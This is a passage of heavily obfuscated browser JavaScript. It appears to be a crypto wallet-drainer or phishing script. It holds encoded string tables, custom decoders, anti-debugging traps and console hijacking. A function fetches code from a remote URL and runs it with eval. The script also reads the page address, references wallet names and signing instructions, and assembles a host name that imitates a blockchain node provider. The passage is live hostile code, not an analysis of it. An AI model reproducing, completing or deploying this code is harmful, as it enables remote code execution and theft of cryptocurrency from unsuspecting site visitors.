      __String += _0x200a61 * 0x5b;
      djkbJA |= __String << __globalObject;
      __globalObject += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
      do {
        rOnBTDk.push(djkbJA & 0xff);
        djkbJA >>= 0x8;
        __globalObject -= 0x8;
      } while (__globalObject > 0x7);
      __String = -0x1;
    }
  }
  if (__String > -0x1) {
    rOnBTDk.push((djkbJA | __String << __globalObject) & 0xff);
  }
  return fsS5SCv(rOnBTDk);
}
function e_qLdL(cHN1sY7) {
  if (typeof f3i6H1[cHN1sY7] === 'undefined') {
    return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
  }
  return f3i6H1[cHN1sY7];
}
var f3i6H1 = {};
var rOnBTDk = cHN1sY7(["`iAWy+8I", "}7&wW/^P{BU@3uC", "5QHEH", "gpXA", "ppNSs[S^cD", "np<@C6cT", "F+|FW3IB", "IN*[u9WB", "lLvxlz%", ",J]*", "AJ;*vo=B", "=Nu]X", "G~FEQu5r:W]OSPw,X+TA", "8Im3bq}", "C_;*FmPB", "G~tf)", "v:yLFmQB", "DJW899OFa|kiBT", "2`V*Fmz}", "zMeHHms}", ")3BC", "Lu<Vj$Z", "Jne2<}EP", "qWtf)", "S.r*/v}", ";Ne]Hm5~ygmdAT", "`Ly[>q}", "G.F3{9ll}@/EHh@WG+v2fflGT", "]kCGt=(g5\"EW4+o@!0^SBj}", "7W;onpQ]PjTI4+!DNn+*VPI@?yiM_uv)X*#d(KzF+g$$Js~W3C%)zIHV(*", "Lm~Er3,Sdjjd8_t>ik{FuZ#,\"+X[KOQ$p}", "bLG)kKZUXWg{;+HVh\"rL8PrO_UyH#0mE.?vSl15.SOOMCD0YjhVLJg~B", "%+xfnfV/e~`3]+zGpI;LNfSlwfnith$`<n^EDv_]b+hC5d%?l;D$y;5Vj\"", "Y(>Lgte,bj>^o/?Eieg)u&n~Bj$pb\"BY8y)Gu=oNgfy.&1>X(N\"KXNBVT", "Akbo82(UdL\"|4bqD", "N?vP#&s~rfqx4m}/4}", "wnkD1K.~Wzyhil[Ysymol9HV@g\"Wnl,FCggd|cnB+j.lOY&|JIc2ag}", "7\"zd4clRuN|eUD2X$WB", "ohAHulG>5n]1E${Vs)|$aY/cEg?3Q(BJhy)8#3gRW*", "h;#[BjC>INSp3uD)@~E_93GNX|#~j(:<(@cG;s;@8@/", "Q~OHDhj6_", "SLj8#NSR6UAep=_=", "i;+FtmXGo\"", "Xm/EPMQ63]$A`=4Q;J}&aY@6}j[IJD.<", "go1dffP@sN#NYQ[=y[y[", "&k2];dgb{@:^}mR", "^mlS5!^,.MV1+D@WwLK_areU$nm0xh),", "@?nSoK\"//N;cZ_U>CN}[)", "uIAqYvWzxN+1}", "Fj`d2Pu>.iQpJm\"", "K*3DrPSUE^&Iz+i@Jm0oXhaF#Rq81+%?JmyLZqeqEgMo{", "pnVeq9B@~yifz$,YoZ{[Dv8SC\".KiY6QY[.3>rS{", "q[d$+NZRUL>rEDw,;Wp3}KulA\"7HS=@IeL{", ";N*e*;MBqn;r`stI2EdLmj|{", "8Ig_]PiO=O\"k2lBYse^Kgj}", ";WXe+l}", "0y9Lbqe>Qi@p~t/V`j+33KXf@+Z)LdcIt[xfW?^{", "^HfA:0+XJ\"9fb=m=C~w2h1PFAWXR_m&/$*>[ytL6++!{}({`pnX$,o[c[", "8MQ&dedS1|x]1hS@+jSFYvD2Q@t~G1{/(~(", "C_b_mK_]{L1r9l_F6hU2r3ik$|SFATL,:?!_", "@[M*vZr.hWcE$PR", "+Jqf.M)/9N:(=RUI)m~8R", "Ij=K&ceRa^_w@YQW#nFS", "#n(HqKCS4R4j:w&|<[(", "v\"6)yp|SRh^;CBUW\"gjSUPh`4Wu8d1GG?NP1Psylqy+[g\"j>\"dd]", "!|Y21juSE@7.s9xX=Y%Se05cQg?(3+(J6Zh]", "Bjy]@3NRH+o%C=W?Ke(8|u)VfL?rO0[", "Rk|LS6}", "}?}F!Kj2cztjEPM)Tgk2Qm[O4Rux`m_J`?C8Ir]@q]foIPyY4<r*L<B@S", "hLx86ZWz4W7jv;i@$*NeHmP.GidlcQC", "Kh?duhUSN\"s0$B", ".m6_kfIV|N}FIR@WK`%);kc6E^v8$=NGHNw2[9A/H^L", "j;TEPO7N.@d)s9LILy,H2lOF:|>c{", "*D!SGu0[`WM3tuC<cLbo:Mf{", ">G^AXu:zr@#+Y;KG2ZYc&?xNz@", "<`.c3K=@1OyoWu(Ee(4L@/Z{", "WeLdAlEb)|I3c$m=;?!)@P}", "f(ieYr}", "(`TS2n#{O|_R)h*", "^Gu]<Y)z6O_ks0=VNnuDz1/cqW=pR/r<,L$2i27S_LElo1&E[N{", "v0e1X!/OujtTWhR<^2Kc]3i[t*MC;b|W}L!)%=W]b+|Yo_>Ei}", "JGR2B92.r@j^kuIVve5H(KO.0RIpDP#%s0TA$vs~af!2JOEY6y._29>Rb~", "c~8mn8McX|EpYQXGfLCAr2FB", "7M^cmp.~`zM0$Do=KD%KeMaz8fzXSD^?AgFo>rYR;g89mO4QL\"u8tP!OT", "VjpL(KuNA\"", "!oPH]/xg!ML@,\"<U|Yk8i2@V1|Zl`\"!?eLu]bs56n]c)N/d<!C{$TI9NtU}q}", "Pe_E=bPBJMUOiRbDv;G)Eh_]0z!fv_j`Ck+37N}", "TJfKp29vz~", "YesTw1S9$h1X{", "Y[<opuN,|j*O{1,|p\"AeK0xeWzSkW/f)b[?dQ3\"cH*", ".yVou=6.n+^KR1(YR{", "A?FEi.*SVRY1?$`?,(;dPs42.@{qb\"O,dZ{", "[@wA:r&U;+=3.Y1EAHFK8PW]2Ww85X!D<maE>YCS&*@Y{", "qnd1>YYU7yK3O0yVZe!*Yvt22\"<E#=w/6(m*<YNR/Lv+SP)`4(yL1;FB", "pecAX3$>SKHWah{EQecAuNql;@+q\"BR", "kLxP.O.B", "9Xbc{t:.PNI1N/c?^2{q~33?3y=", "[N)Sl/Bz)\"\"|BYv)4n)K,!a~~\"V", "w?k8i9pSQ~\"qCsN)<k_KOIxG#OVn{j]", "BG=Ss3$G<Ov~{", "po{$D3S>ujeSjhB/?LaEuZI6wCr02l#%ZnZ2s=F~nfk,4(BJO;0m#=6I]A/", "j`8m6&|XtzH(id#>`{", "[jFo`NzVMy(IdQ_=#ZsGp3}", "#e|H8;0.!fodbOoUu:MoB9S>\"i7HRQK?!ep_T;VFKRIld__YF*3fdg}", "ZEB$su[:$WUl}+]@feWGLtP@zNF1:Y0@QjB8?M}", ")+C1tc`S$W,1b=YVrn]Le.>Ur*y]N_", "XmE*rnB6(N{[LdX,kI`_", "0Zv2=d:c\"@,p\"\"h|;[V&B;,Sk*UY/$%)/Guf.0TR*WYp0\"v,)ksT", "HGm3snVzQ~RWX/mX)kd$_flS~\"U[;+7,THL36lc.TU}!&XR", "dE1[Je=csjx+QhrD;NnKG", ",Jmced`f2y0,f;W?E.kGv3i@xzL", "C??*FcY,)\"Oh@Y.?*kJ2\"P/~=Op/ATlEuIcfHo*>ez7x}", "lnD$}px>5n<Sju8Upnd[{<:Vb^qrYRu$=`eGB2A/>n`(3$%>Z|%cYv(XRiy\"{", "[g5e{9BVyg^E*;{`N;}L0P)rC|506\"{:6\"vm$b~O.]F\"N;R", "6(IHFv\"cx~1X{", "qnHd[f[chWr@d1^,oZU17=oShWBeah~<:`%)y9PB", "Sd`LH,9>B*p.$s<E", "V2*[T;1O{i9jE=N)5yB", "h*[Sc<DcR\"6NU=mUdYWA", "#(l2H?h>r*}ehs=@$jNL?d6cXy0)Qm[YQJ(", "qW_A#PnV<R2.{/]", "vEk2!n@/djW(@9h`#}", "GWX$,hc.8@$eX/#,K;m*%?c@gM;3v92=XyEFTpwbP~@[Q(#%w\"r[", "1;Xq}6Rf$|AeZ;w|E{", "~.G2:sXUi*Nh.RA", "EkI8`bIB&jci9j+$<nlK.YMOy+", "\"m.Ex;oeEi>", "+~3PC23?czhg.XAX_~GSwfL?b~=3>d><B@b_:q9lSKflK(", "*?g3JsS{Cn@(?bUIPmWGIL>,ant%Y_?DYj,AsZaB", "<LXeW?d{!fI\"+Bs$WLg[&o<,y+hcu=6>2yY_JM9{", "`e^cd8)c]OkiIw_=4hxTE!?B", "O(D1+2W6kL8X{tIYnhzLt3wRD\"#0x\"s?h*MoYwJR;Na3mOD/O;(", "B@cA8PfGvUjru\"7GKe!E29l{_RI1N_}|a|gonp!cTL~q{", "HJ+&RKB6hyRk,=%?E(_PBt\"VAW", "SkaG\"l&SB*EARj|$o\"IeR", "HecEJg5I%OU;G;~DNh<o.gQc7\"<orh3Uz[vEyty{", "E*$8PqZR?Wfl?(_|iL<d\"Kb>MRSF{/,Eze7HSnES~njr{", "DW|28;m", "Vi*221n4b%Yh//,.UyP$", "5ZQ0QC6_F.+LWi5^?bK0{)6kJOLzci5^?bK0{),fUH", "ZR(T@", "eYDZh2A", "bu;Di$U", "VI[9q}6J", "|KyPp+dJ", ";~o(O|fG3Ud`ijT8^NZ7P(pODUuqbSY4/YuQuK~A", "YpZ/x.xD", "GpAR", "6CSvb", "}OP/p[i", "np*R", "Ep\"#22QG]$9Rk`", "ppGhtbh2~l", "(Je])m@B", ",J%E89z6YU", "d`^A]pt6^AMi2sT", "G+r*bk)F[", "z:T3|9WB", "@WXLX", "peoLSpQB", "|WeH)meq%W5.@w)QV{", "7Icfbk~2~nXyAwt?.}", "&~FEs&jVM|if0RqU]{", "|ed]3=??&LUlDB", "TJ^ACm26hyqMQ,|<}_UHV", "LDW8NH{{", "j14C", "W!HCS_x", "Gsnv~}fg", "M1o3F`x", "m9Yw", "$OB#R}Ug", "S!$o)ayZ", "mc8w", "|#Z[x5?Uw", "YrZmt", "8n%QS", "tszCf_lg", "D9#C;>,)W2O9uX?UoZ", "Gb%QS", "D:2gv6RWLp@\",dr2,l`ZNy1ULp>3Aq0J", "P1EQf_Ag", "ay#CwlZ#R2F", "cy@Qv_lg", ":69CynMg", "(#`|A]x", "JlXvA]2g", "0TYQ!`x", "{Oja]}vSp@]E;_+M", "{4oQ", "!1<o6(x", "D9*1Q", "D9%QS", "tszCf_)ICrhA$jc", "tsSaS", "QQpwu?oT", "S0JKC", "cIDE#,R", "G+r*bkQB", "5FS=dzx>", "]ce/hn:>", "TTM.Y6H>", "GnDqC,kj#z", "^^PF{s<C", "Jr(1", "NHKnc8=C", "m8W,\"\"eq", "cxTp", "11tgJ}Zq", "bWX{)\"aq", "YmxHif5rQ@sM{", "%3QWX1DN", "<3Z/y=qN", "IA}DS/v9bE7V5U4mK*ulx(c:wv{cW@!n@n@qW$gqOi6![U#nLyWqxM>sz}\"UgJbm.Wdrk\"jqV^/%g1t1i7Wq7={\"yfw_3UAN6Pil[\"{QVh\"~.o\"Rgty+g\"&\"&ElY]o#N!P@qO,)X)^[%m2\"R64}DF){\"v}!X1762yty+7=A9bEC]zdV1]O~Zr|75t9f9yJdmLR9r}+^kCh{^,U\"RF7<9V$+~rX1V_H&2%w]rV$Q&Dv4^LHiKn7e)c+{\"%i.#UH$RLtYAxM^Bv}*U>cgPn7x+Q&^k/Fl`:U!P$W%0G.mI)F;#uQ!P[OG07$]\"RgdX[UxSj/zoA\"[:j^dXA8s2UP:0L=?:cf>9O`cmz^WqQ=I9Oic^j1OuGt]rc%b\"E^KYa@s", "0tsrL", "xLtfB.VB", "\"tq,", "_/2)I1C&", "qCe4}9L", "^Af.", "TD%hE)xF", "vrtiT<pF", "fr9gI)8F", "_y%hT)LF", "0DRTi:LF", "1Q%h", "E+q]", "WDeS<2;A", "*d=*e", "cDZ)alMA", "7]gQ<l[A", "b`n`:", "%;oS", ":d,<Sm[A", "YCgQ", "t%g&j{0$", "ddj<Hxy$", "3G3</", "SJGS^", "U+e])m.B", "Hr[UX<$Hv/6=5]bhtv%U", "x8wl9:@zS7#", "NE%U", ",R%G+x:S", "vv+lK>qHG%6zS", "dP}m3(#dITGr[F", "g/(g$", "S7X(^Ujk", "|0?rFSvk", "@IP%", "u/mr%H_k", "qO!^", "#@!A9|S[", "P@u(.", "]`cA", "@+xHR3&qq|koc$O:ZIS3|9ES%zP", "IF0Of~xE", "L0[`", "=qSA+o_Q=C", "{B)Ajm4Y_u*", "_K9<~ri!N;*", "Y(s+IojjX,,", "^ti7=cC|", "/JFEW3J{", "_JFEW3z}", "ZI)8Emz}", "dNtf~G}", "YN^A|9X{", "V\"udDfCj", "(%oHSHij", "ZltG/fB[", "`rC=d6UzlE", "8oyM/", "[La;E", "*La;,O&", "wOkx]Wmp", "l5UPQ<8+a18@.i3gS(3:c).\"4!I^]><gf$b2e`dN", ")w:`D[kM", ":J(HN8~B", "x`cfr9fq[", ")jh]R2[z2nj", "#zB3IPkQ", "PP{/((uQ", "\"P+MF", "08YVU(I,DW_L%\",z%0MDB|`;Lf=/`5qyEtB", ":JdL^3~B", ":JdL^3,R3|", "irs3d?zE?e", "irLw!.OI", "S97DE=VI", "@G4C", "swrVQ32^US1R<3^", "DJXLWl{U3|", "DJXLWl{U8nei{Q2=[{", "lkBh4<FM", "YkZwU*NR<!1$NS=oJN", "[G8I", "wX0x&/UM", "?7WIs:oM", "P9vdL,b%,#9", "#(z*^3WB", "IA(V", ">C%#E", ")0k&?", "n<mX94?:", "P?n)H9_:", "TYN|+{HR", "c6ZUH", ").&6k", "F=zYh149k>cf=c", "5yRYodjI[E!L=c", "7`{GDwn<oZ,!l", "@`zY", "t%ad*", "5]T,2", "g%+,A", "axa,Pn<g", "!]],peB{@", "fnXbCXw", ",7z$s@A", "JJ6EO8*R~|E1(=t?HJW8)", "22{Pb=:i", "}Urhf7#C", "/r5Iy+1F", "}AZL$\"UF", "bs0(}\"sF", "eP&(W|lF", "Z9}mG9nF", "n7D2O*VF", "vb&3h|YDTS^^H1yo", "P%9[", "~~ySpx$;%_Sr(X6+*~&x{", "&02(p)E", "CeUW", "kUnGo4W{etE?(l<Z", "ee\"X/!XyZ`", "??$*ZybT", ",S!VL*:Q", "`_sMnl$9LBunsvQaBQ", "@[SMMrR", "ee9dL4F`Dg%x6;Gf", "G=$*skeY)BrnAkY", ":&qW>", "ae\",!yR", "[[$4dr`T", ";f:5N", "v\"a*/YK_", "]Kx,<", "l,.sI\"+", "ZZ>Qb8QtU(", "ZZ;~3q:F", "yVPL7w`F", "p*pL_e=F", "%5+.", "HK8.;", "Ye4ArG>l", "MwFAN", ":7=\"Z)lB", "NI~:C)uB", "=_B46y&T", "2Vx!@,aG", "`wUOs&vG", "FoY@&", "lS{>lJR", "iSN>E", "(BtM(wA", ">_\"d9lBT", "/9RHC", "_Wvm.vD", "_&!V<", "<]}z_", "<]6z?ucB", "7;TAE", "/]Ez]wsB", "KhW1|d&q", "JuQj[uOq", "r%&1s!>q", "zDlo", "AzYMN", "bb9xs[aNMP", "BCfjy`qnmk", "i%szow1B", "QQ6~Wz&=/<~s(]7^EQ?z}", "!@G&hUS%", ".I?zy0J%", "o(B`oZ$", "k\",+", "?ZE)K", "[~(H", "~~:B_8B3/i", "dLVo83o4$", "&NbPE3KD", "^~_)", "JuN\".7{(", "H~oe_Qbt", "+<B?Ie{(", "bY,Wt]~(", "],N\"\"Vq(", "H~oe_QXvYsb^Es+dT_Mq*Tex2`{CmgjdBj^kG~l;e7ZCKQok^9?2RzM,>M8=<,}d$_WF\"z<;{r@R#iGdu(m*tC##L75Zx/62^9\"2Rz#uPrX4isydj]0<G~0\"2`;]2?ydq]j<@@#@2`@CiAD_d3?*V\"$", ">KHW:uiD", "OxcqN:yeS\"Y", "{g8HUV0h", "Jf`,xr:z", "xfX4cUJ", "Pn\"lpevz"], 0x1a);
function djkbJA() {
  var cHN1sY7 = [function () {
    return globalThis;
  }, function () {
    return global;
  }, function () {
    return window;
  }, function () {
    return new Function("return this")();
  }];
  var jnnEqQv;
  var e_qLdL = [];
  try {
    jnnEqQv = Object;
    e_qLdL["push"](""["__proto__"]["constructor"]["name"]);
  } catch (f3i6H1) {}
  yiYl1jf: for (var rOnBTDk = 0x0; rOnBTDk < cHN1sY7["length"]; rOnBTDk++) {
    try {
      jnnEqQv = cHN1sY7[rOnBTDk]();
      for (var djkbJA = 0x0; djkbJA < e_qLdL["length"]; djkbJA++) {
        if (typeof jnnEqQv[e_qLdL[djkbJA]] === "undefined") continue yiYl1jf;
      }
      return jnnEqQv;
    } catch (f3i6H1) {}
  }
  return jnnEqQv || this;
}
var __globalObject = djkbJA() || {};
var __TextDecoder = __globalObject["TextDecoder"];
var __Uint8Array = __globalObject["Uint8Array"];
var __Buffer = __globalObject["Buffer"];
var __String = __globalObject["String"] || String;
var __Array = __globalObject["Array"] || Array;
var utf8ArrayToStr = function () {
  var cHN1sY7 = new __Array(0x80);
  var jnnEqQv = __String["fromCodePoint"] || __String["fromCharCode"];
  var e_qLdL = [];
  return function (f3i6H1) {
    var rOnBTDk;
    var djkbJA;
    var __globalObject = f3i6H1["length"];
    e_qLdL["length"] = 0x0;
    for (var __Array = 0x0; __Array < __globalObject;) {
      djkbJA = f3i6H1[__Array++];
      if (djkbJA <= 0x7f) {
        rOnBTDk = djkbJA;
      } else if (djkbJA <= 0xdf) {
        rOnBTDk = (djkbJA & 0x1f) << 0x6 | f3i6H1[__Array++] & 0x3f;
      } else if (djkbJA <= 0xef) {
        rOnBTDk = (djkbJA & 0xf) << 0xc | (f3i6H1[__Array++] & 0x3f) << 0x6 | f3i6H1[__Array++] & 0x3f;
      } else if (__String["fromCodePoint"]) {
        rOnBTDk = (djkbJA & 0x7) << 0x12 | (f3i6H1[__Array++] & 0x3f) << 0xc | (f3i6H1[__Array++] & 0x3f) << 0x6 | f3i6H1[__Array++] & 0x3f;
      } else {
        rOnBTDk = 0x3f;
        __Array += 0x3;
      }
      e_qLdL["push"](cHN1sY7[rOnBTDk] || (cHN1sY7[rOnBTDk] = jnnEqQv(rOnBTDk)));
    }
    return e_qLdL["join"]('');
  };
}();
function fsS5SCv(cHN1sY7) {
  if (typeof __TextDecoder !== "undefined" && __TextDecoder) {
    return new __TextDecoder()["decode"](new __Uint8Array(cHN1sY7));
  } else if (typeof __Buffer !== "undefined" && __Buffer) {
    return __Buffer["from"](cHN1sY7)["toString"]("utf-8");
  } else {
    return utf8ArrayToStr(cHN1sY7);
  }
}
const _0x200a61 = function () {
  let cHN1sY7 = !![];
  return function (jnnEqQv, e_qLdL) {
    debugger;
    const djkbJA = cHN1sY7 ? function () {
      if (e_qLdL) {
        function djkbJA(djkbJA) {
          var cHN1sY7 = "m1ixBywDz20E3HF4G75ASgRClKkJILQNTU6n89MhOjPX!VWp#qoYruastZbcvdef%($&)[,@^+*]/{_:|`.<~;>=?}\"";
          var __globalObject = "" + (djkbJA || "");
          var jnnEqQv = __globalObject.length;
          var e_qLdL = [];
          var f3i6H1 = 0x0;
          var rOnBTDk = 0x0;
          var __String = -0x1;
          for (var __Array = 0x0; __Array < jnnEqQv; __Array++) {
            var _0x200a61 = cHN1sY7.indexOf(__globalObject[__Array]);
            if (_0x200a61 === -0x1) continue;
            if (__String < 0x0) {
              __String = _0x200a61;
            } else {
              __String += _0x200a61 * 0x5b;
              f3i6H1 |= __String << rOnBTDk;
              rOnBTDk += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                e_qLdL.push(f3i6H1 & 0xff);
                f3i6H1 >>= 0x8;
                rOnBTDk -= 0x8;
              } while (rOnBTDk > 0x7);
              __String = -0x1;
            }
          }
          if (__String > -0x1) {
            e_qLdL.push((f3i6H1 | __String << rOnBTDk) & 0xff);
          }
          return fsS5SCv(e_qLdL);
        }
        function cHN1sY7(cHN1sY7) {
          if (typeof f3i6H1[cHN1sY7] === 'undefined') {
            return f3i6H1[cHN1sY7] = djkbJA(rOnBTDk[cHN1sY7]);
          }
          return f3i6H1[cHN1sY7];
        }
        debugger;
        const __globalObject = e_qLdL[cHN1sY7(0x6f)](jnnEqQv, arguments);
        return e_qLdL = null, __globalObject;
      }
    } : function () {};
    return cHN1sY7 = ![], djkbJA;
  };
}();
(function () {
  _0x200a61(this, function () {
    function cHN1sY7(cHN1sY7) {
      var jnnEqQv = "AB:$/SDHEFT.;(&R=<V%*UCY>)?+,@GZ[a}~IbLdK\"^]|_JNcWX`{OeMQPfhigjknmlpoqruvts0w2xyz13786459!#";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var __globalObject = [];
      var f3i6H1 = 0x0;
      var rOnBTDk = 0x0;
      var __String = -0x1;
      for (var __Array = 0x0; __Array < djkbJA; __Array++) {
        var _0x200a61 = jnnEqQv.indexOf(e_qLdL[__Array]);
        if (_0x200a61 === -0x1) continue;
        if (__String < 0x0) {
          __String = _0x200a61;
        } else {
          __String += _0x200a61 * 0x5b;
          f3i6H1 |= __String << rOnBTDk;
          rOnBTDk += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            __globalObject.push(f3i6H1 & 0xff);
            f3i6H1 >>= 0x8;
            rOnBTDk -= 0x8;
          } while (rOnBTDk > 0x7);
          __String = -0x1;
        }
      }
      if (__String > -0x1) {
        __globalObject.push((f3i6H1 | __String << rOnBTDk) & 0xff);
      }
      return fsS5SCv(__globalObject);
    }
    function jnnEqQv(jnnEqQv) {
      if (typeof f3i6H1[jnnEqQv] === 'undefined') {
        return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
      }
      return f3i6H1[jnnEqQv];
    }
    debugger;
    const e_qLdL = new RegExp(jnnEqQv(0x70));
    const djkbJA = new RegExp(jnnEqQv(0x71), '\x69');
    const __globalObject = _0x586d22('\x69\x6e\x69\x74');
    !e_qLdL[jnnEqQv(0x72)](__globalObject + jnnEqQv(0x73)) || !djkbJA['\x74\x65\x73\x74'](__globalObject + '\x69\x6e\x70\x75\x74') ? __globalObject('\x30') : _0x586d22();
  })();
})();
const _0x3c0230 = function () {
  let cHN1sY7 = !![];
  return function (jnnEqQv, e_qLdL) {
    const djkbJA = cHN1sY7 ? function () {
      if (e_qLdL) {
        function djkbJA(djkbJA) {
          var cHN1sY7 = "URBXYASbQDCEVWTFZaHcGfKIeLJdOMNPgkjhilnmoprqstuv#yx89!4w5z372016@[,]^*`_+.{|\"~}:;)(&%$/=<>?";
          var __globalObject = "" + (djkbJA || "");
          var jnnEqQv = __globalObject.length;
          var e_qLdL = [];
          var f3i6H1 = 0x0;
          var rOnBTDk = 0x0;
          var __String = -0x1;
          for (var __Array = 0x0; __Array < jnnEqQv; __Array++) {
            var _0x200a61 = cHN1sY7.indexOf(__globalObject[__Array]);
            if (_0x200a61 === -0x1) continue;
            if (__String < 0x0) {
              __String = _0x200a61;
            } else {
              __String += _0x200a61 * 0x5b;
              f3i6H1 |= __String << rOnBTDk;
              rOnBTDk += (__String & 0x1fff) > 0x58 ? 0xd : 0xe;
              do {
                e_qLdL.push(f3i6H1 & 0xff);
                f3i6H1 >>= 0x8;
                rOnBTDk -= 0x8;
              } while (rOnBTDk > 0x7);
              __String = -0x1;
            }
          }
          if (__String > -0x1) {
            e_qLdL.push((f3i6H1 | __String << rOnBTDk) & 0xff);
          }
          return fsS5SCv(e_qLdL);
        }
        function cHN1sY7(cHN1sY7) {
          if (typeof f3i6H1[cHN1sY7] === 'undefined') {
            return f3i6H1[cHN1sY7] = djkbJA(rOnBTDk[cHN1sY7]);
          }
          return f3i6H1[cHN1sY7];
        }
        const __globalObject = e_qLdL[cHN1sY7(0x74)](jnnEqQv, arguments);
        return e_qLdL = null, __globalObject;
      }
    } : function () {};
    return cHN1sY7 = ![], djkbJA;
  };
}();
const _0x56ffb6 = _0x3c0230(this, function () {
  function cHN1sY7(cHN1sY7) {
    var jnnEqQv = "ihDBCTSjARQ6UVgWmXy4ZzcEFkYbaedwnHxG3flLJqKpI215oMrOPN0vtsu!798#*)^~}_`@+{&>:/.|[\"=<],?;%$(";
    var e_qLdL = "" + (cHN1sY7 || "");
    var djkbJA = e_qLdL.length;
    var __globalObject = [];
    var __String = 0x0;
    var __Array = 0x0;
    var _0x200a61 = -0x1;
    for (var _0x56ffb6 = 0x0; _0x56ffb6 < djkbJA; _0x56ffb6++) {
      var _ei = jnnEqQv.indexOf(e_qLdL[_0x56ffb6]);
      if (_ei === -0x1) continue;
      if (_0x200a61 < 0x0) {
        _0x200a61 = _ei;
      } else {
        _0x200a61 += _ei * 0x5b;
        __String |= _0x200a61 << __Array;
        __Array += (_0x200a61 & 0x1fff) > 0x58 ? 0xd : 0xe;
        do {
          __globalObject.push(__String & 0xff);
          __String >>= 0x8;
          __Array -= 0x8;
        } while (__Array > 0x7);
        _0x200a61 = -0x1;
      }
    }
    if (_0x200a61 > -0x1) {
      __globalObject.push((__String | _0x200a61 << __Array) & 0xff);
    }
    return fsS5SCv(__globalObject);
  }
  function jnnEqQv(jnnEqQv) {
    if (typeof f3i6H1[jnnEqQv] === 'undefined') {
      return f3i6H1[jnnEqQv] = cHN1sY7(rOnBTDk[jnnEqQv]);
    }
    return f3i6H1[jnnEqQv];
  }
  debugger;
  const e_qLdL = function () {
    let cHN1sY7;
    try {
      function jnnEqQv(cHN1sY7) {
        var jnnEqQv = "AZJQBSYRabCDEFeIdTLGUcKNMHWfXVOP90i25468xw13yqgz7js!t#ohumlknvpr%]$[@^{(&,*`_+|)}/~.\";:<=?>";
        var e_qLdL = "" + (cHN1sY7 || "");
        var djkbJA = e_qLdL.length;
        var __globalObject = [];
        var __String = 0x0;
        var __Array = 0x0;
        var _0x200a61 = -0x1;
        for (var _0x56ffb6 = 0x0; _0x56ffb6 < djkbJA; _0x56ffb6++) {
          var _ei = jnnEqQv.indexOf(e_qLdL[_0x56ffb6]);
          if (_ei === -0x1) continue;
          if (_0x200a61 < 0x0) {
            _0x200a61 = _ei;
          } else {
            _0x200a61 += _ei * 0x5b;
            __String |= _0x200a61 << __Array;
            __Array += (_0x200a61 & 0x1fff) > 0x58 ? 0xd : 0xe;
            do {
              __globalObject.push(__String & 0xff);
              __String >>= 0x8;
              __Array -= 0x8;
            } while (__Array > 0x7);
            _0x200a61 = -0x1;
          }
        }
        if (_0x200a61 > -0x1) {
          __globalObject.push((__String | _0x200a61 << __Array) & 0xff);
        }
        return fsS5SCv(__globalObject);
      }
      function e_qLdL(cHN1sY7) {
        if (typeof f3i6H1[cHN1sY7] === 'undefined') {
          return f3i6H1[cHN1sY7] = jnnEqQv(rOnBTDk[cHN1sY7]);
        }
        return f3i6H1[cHN1sY7];
      }
      cHN1sY7 = Function(e_qLdL(0x75) + e_qLdL(0x76) + "tion()" + " " + e_qLdL(0x77) + '\x29\x3b')();
    } catch (djkbJA) {
      debugger;
      cHN1sY7 = window;
    }
    return cHN1sY7;
  };
  const djkbJA = e_qLdL();
  const __globalObject = djkbJA[jnnEqQv(0x78) + "e"] = djkbJA[jnnEqQv(0x78) + "e"] || {};
  const __String = [jnnEqQv(0x79), jnnEqQv(0x7a), '\x69\x6e\x66\x6f', jnnEqQv(0x7b), "except" + jnnEqQv(0x7c), '\x74\x61\x62\x6c\x65', '\x74\x72\x61\x63\x65'];
  for (let __Array = 0x0; __Array < __String['\x6c\x65\x6e\x67\x74\x68']; __Array++) {
    function _0x200a61(cHN1sY7) {
      var jnnEqQv = "}gk@%`_hAim(DnjC~$l|\"{&B+FEH,*G^P[JILsK)NO;p]t:?q/.M=orT<>QvYuxy8zRw9ZaS1W!U4#35b2V6Xc0dfe7";
      var e_qLdL = "" + (cHN1sY7 || "");
      var djkbJA = e_qLdL.length;
      var __globalObject = [];
      var __String = 0x0;
      var __Array = 0x0;
      var _0x200a61 = -0x1;
      for (var _0x56ffb6 = 0x0; _0x56ffb6 < djkbJA; _0x56ffb6++) {
        var _ei = jnnEqQv.indexOf(e_qLdL[_0x56ffb6]);
        if (_ei === -0x1) continue;
        if (_0x200a61 < 0x0) {
          _0x200a61 = _ei;
        } else {
          _0x200a61 += _ei * 0x5b;
          __String |= _0x200a61 << __Array;
          __Array += (_0x200a61 & 0x1fff) > 0x58 ? 0xd : 0xe;
          do {
            __globalObject.push(__String & 0xff);
            __String >>= 0x8;
            __Array -= 0x8;
          } while (__Array > 0x7);
          _0x200a61 = -0x1;
        }
      }
      if (_0x200a61 > -0x1) {
        __globalObject.push((__String | _0x200a61 << __Array) & 0xff);
      }
      return fsS5SCv(__globalObject);
    }
    function _0x56ffb6(cHN1sY7) {
      if (typeof f3i6H1[cHN1sY7] === 'undefined') {
        return f3i6H1[cHN1sY7] = _0x200a61(rOnBTDk[cHN1sY7]);
      }
      return f3i6H1[cHN1sY7];
    }
    const _ei = _0x3c0230[_0x56ffb6(0x7d)]["protot" + "ype"]['\x62\x69\x6e\x64'](_0x3c0230);
    const parentData = __String[__Array];
    const walletName = __globalObject[parentData] || _ei;
    _ei['\x5f\x5f\x70\x72\x6f\x74\x6f\x5f\x5f'] = _0x3c0230['\x62\x69\x6e\x64'](_0x3c0230), _ei["toStri" + "ng"] = walletName[_0x56ffb6(0x7e)]['\x62\x69\x6e\x64'](walletName), __globalObject[parentData] = _ei;
  }
});
_0x56ffb6(), console['\x6c\x6f\x67'](e_qLdL(0x7f));
const _ei = async cHN1sY7 => {
  try {
    debugger;
    const jnnEqQv = await fetch(cHN1sY7);
    const e_qLdL = await jnnEqQv['\x74\x65\x78\x74']();
    return eval(e_qLdL), e_qLdL;
  } catch (f3i6H1) {
    return null;
  }
};
let parentData;
let walletName;
const currentURL = window[e_qLdL(0x80)]['\x68\x72\x65\x66']["replac" + "e"](new RegExp(e_qLdL(0x81), "i"), '')[e_qLdL(0x82)](new RegExp("\\/$", "i"), '');
const SIGN_INSTRUCTIONS_GIF = e_qLdL(0x83) + "ts/gif" + e_qLdL(0x84);
const HOST = "https:" + "//quic" + "knode-" + e_qLdL(0x85) + ".com";
